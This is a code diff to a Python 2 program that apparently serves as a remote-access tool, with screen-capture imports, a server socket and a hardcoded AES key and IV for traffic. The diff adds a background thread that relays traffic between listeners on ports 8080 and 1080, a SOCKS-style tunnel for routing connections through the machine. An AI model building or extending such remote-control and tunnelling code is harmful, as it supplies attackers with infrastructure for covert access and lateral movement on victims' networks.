@@ -5,7 +5,7 @@ from PIL import ImageGrab
 from PIL import ImageOps
 import PIL
 import numpy as np
-import cv2
+import cv2, threading, select
 from Crypto.Cipher import AES
  
 serversock = socket.socket()
@@ -19,7 +19,55 @@ aesobj = AES.new('brvty5b6BB7y56b754BBERBT', AES.MODE_CFB, 'odiryvt93y489yrv')
                                                         #Cryptography stuff
 EncodeAES = lambda  s: base64.b64encode(aesobj.encrypt(s))
 DecodeAES = lambda  e: aesobj.decrypt(base64.b64decode(e))
- 
+
+def create_socks_proxy():
+	remote_sock_s = socket.socket()
+	remote_sock_s.bind(("0.0.0.0",8080))
+	remote_sock_s.listen(1)
+	
+	local_sock_s = socket.socket()
+	local_sock_s.bind(("0.0.0.0",1080))
+	local_sock_s.listen(1)
+	while True:
+		remote_socket, addr = remote_sock_s.accept()
+		print "got local"
+		#local_socket.setblocking(0)
+		
+		
+		try:
+			local_socket, addr = local_sock_s.accept()
+			print "got remote"
+		except Exception as e:
+			print e
+			continue
+			
+		#remote_socket.setblocking(0)
+			
+		while True:
+			try:
+				readable, writable, errored = select.select([local_socket, remote_socket], [], [])
+			except Exception as e:
+				print e
+				break
+				
+			if local_socket in readable:
+				try:
+					local_data = local_socket.recv(4096)
+					if not local_data: break
+					remote_socket.sendall(local_data)
+				except Exception as e:
+					print e
+				
+			if remote_socket in readable:
+				try:
+					remote_data = remote_socket.recv(4096)
+					if not remote_data: break
+					local_socket.sendall(remote_data)
+				except Exception as e:
+					print e
+					
+threading.Thread(target = create_socks_proxy).start()
+
 def Send(sock, data):
     if not data:
         data = " "
